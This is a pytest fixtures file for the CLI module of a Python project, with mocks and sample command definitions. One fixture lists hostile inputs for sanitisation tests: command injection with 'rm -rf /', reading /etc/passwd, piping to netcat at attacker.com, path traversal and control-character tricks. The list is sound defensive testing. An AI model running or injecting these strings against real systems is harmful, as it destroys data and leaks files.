"""
=============================================================================
 Licensed Materials, Property of neuraldevelopment, Munich
 Project : basefunctions
 Copyright (c) by neuraldevelopment
 All rights reserved.

 Description:
 Shared pytest fixtures for CLI module tests.
 Provides common test infrastructure for CLI components.

 Log:
 v1.0.0 : Initial test fixture implementation
=============================================================================
"""

# -------------------------------------------------------------
# IMPORTS
# -------------------------------------------------------------
# Standard library imports
from typing import Dict, List
from unittest.mock import Mock

# External imports
import pytest

# Project imports
from basefunctions.cli import (
    ArgumentSpec,
    CommandMetadata,
    BaseCommand,
    ContextManager,
    CommandRegistry,
)

# -------------------------------------------------------------
# FIXTURES
# -------------------------------------------------------------


@pytest.fixture
def mock_context_manager() -> ContextManager:
    """
    Provide ContextManager instance for testing.

    Returns
    -------
    ContextManager
        Fresh context manager with test app name

    Notes
    -----
    Provides clean context state for each test
    """
    return ContextManager(app_name="test_app")


@pytest.fixture
def mock_command_registry() -> CommandRegistry:
    """
    Provide CommandRegistry instance for testing.

    Returns
    -------
    CommandRegistry
        Fresh command registry

    Notes
    -----
    Starts with empty registry, no handlers registered
    """
    return CommandRegistry()


@pytest.fixture
def sample_argument_spec() -> ArgumentSpec:
    """
    Provide sample ArgumentSpec for testing.

    Returns
    -------
    ArgumentSpec
        Simple required string argument

    Notes
    -----
    Basic argument specification without complex features
    """
    return ArgumentSpec(name="test_arg", arg_type="string", required=True, description="Test argument")


@pytest.fixture
def sample_command_metadata(sample_argument_spec: ArgumentSpec) -> CommandMetadata:
    """
    Provide sample CommandMetadata for testing.

    Parameters
    ----------
    sample_argument_spec : ArgumentSpec
        Fixture providing argument spec

    Returns
    -------
    CommandMetadata
        Complete command metadata with args and examples

    Notes
    -----
    Includes one required arg and usage examples
    """
    return CommandMetadata(
        name="test_cmd",
        description="Test command for testing",
        usage="test_cmd <arg>",
        args=[sample_argument_spec],
        examples=["test_cmd value1", "test_cmd value2"],
        requires_context=False,
        aliases=["tc"],
    )


@pytest.fixture
def concrete_base_command(mock_context_manager: ContextManager) -> BaseCommand:
    """
    Provide concrete BaseCommand implementation for testing.

    Parameters
    ----------
    mock_context_manager : ContextManager
        Fixture providing context manager

    Returns
    -------
    BaseCommand
        Concrete command handler implementation

    Notes
    -----
    Implements abstract methods for testing base class behavior
    """

    class TestCommand(BaseCommand):
        """Test implementation of BaseCommand."""

        def register_commands(self) -> Dict[str, CommandMetadata]:
            """Register test commands."""
            return {
                "test": CommandMetadata(
                    name="test",
                    description="Test command",
                    usage="test <arg>",
                    args=[ArgumentSpec("arg", "string", required=True)],
                ),
                "other": CommandMetadata(name="other", description="Other command", usage="other", args=[]),
            }

        def execute(self, command: str, args: List[str]) -> None:
            """Execute test command."""
            if command == "test":
                if not args:
                    raise ValueError("Missing required argument")
                print(f"Executed test with: {args[0]}")
            elif command == "other":
                print("Executed other command")
            else:
                raise ValueError(f"Unknown command: {command}")

    return TestCommand(mock_context_manager)


@pytest.fixture
def mock_readline():
    """
    Provide mock readline module for completion testing.

    Returns
    -------
    Mock
        Mock readline module with required methods

    Notes
    -----
    Simulates readline module for platforms where it may be unavailable
    """
    mock_rl = Mock()
    mock_rl.get_line_buffer = Mock(return_value="")
    mock_rl.set_completer = Mock()
    mock_rl.parse_and_bind = Mock()
    mock_rl.read_history_file = Mock()
    mock_rl.write_history_file = Mock()
    return mock_rl


@pytest.fixture
def mock_logger():
    """
    Provide mock logger for testing logging calls.

    Returns
    -------
    Mock
        Mock logger with standard methods

    Notes
    -----
    Captures log calls without actual logging
    """
    mock_log = Mock()
    mock_log.info = Mock()
    mock_log.critical = Mock()
    mock_log.warning = Mock()
    mock_log.error = Mock()
    return mock_log


@pytest.fixture
def malicious_inputs() -> List[str]:
    """
    Provide list of malicious input patterns for security testing.

    Returns
    -------
    List[str]
        Malicious input patterns including shell metacharacters and path traversal

    Notes
    -----
    CRITICAL: Used for testing input validation and sanitization
    """
    return [
        # Shell metacharacters
        "command; rm -rf /",
        "command && cat /etc/passwd",
        "command | nc attacker.com 4444",
        "command `whoami`",
        "command $(whoami)",
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "./../sensitive/file",
        "legitimate/../../etc/passwd",
        # Special characters
        "command\x00null",
        "command\ninjection",
        "command\rinjection",
        # Excessively long input (DoS)
        "A" * 10000,
        # Unicode/encoding attacks
        "command\u202e",  # Right-to-left override
        "café\u0301",  # Unicode normalization attack
    ]


@pytest.fixture
def registry_with_context(mock_context_manager: ContextManager) -> CommandRegistry:
    """
    Provide CommandRegistry with context set.

    Parameters
    ----------
    mock_context_manager : ContextManager
        Context manager fixture

    Returns
    -------
    CommandRegistry
        Registry with context configured for lazy loading

    Notes
    -----
    Required for lazy loading tests - context must be set before handler import
    """
    registry = CommandRegistry()
    registry.set_context(mock_context_manager)
    return registry


@pytest.fixture
def mock_handler_class():
    """
    Provide mock handler class for lazy loading tests.

    Returns
    -------
    Mock
        Mock handler class that returns mock BaseCommand instance

    Notes
    -----
    Simulates external command handler module for lazy loading validation
    """
    from unittest.mock import Mock

    mock_class = Mock(spec=BaseCommand)
    mock_instance = Mock(spec=BaseCommand)
    mock_class.return_value = mock_instance
    return mock_class
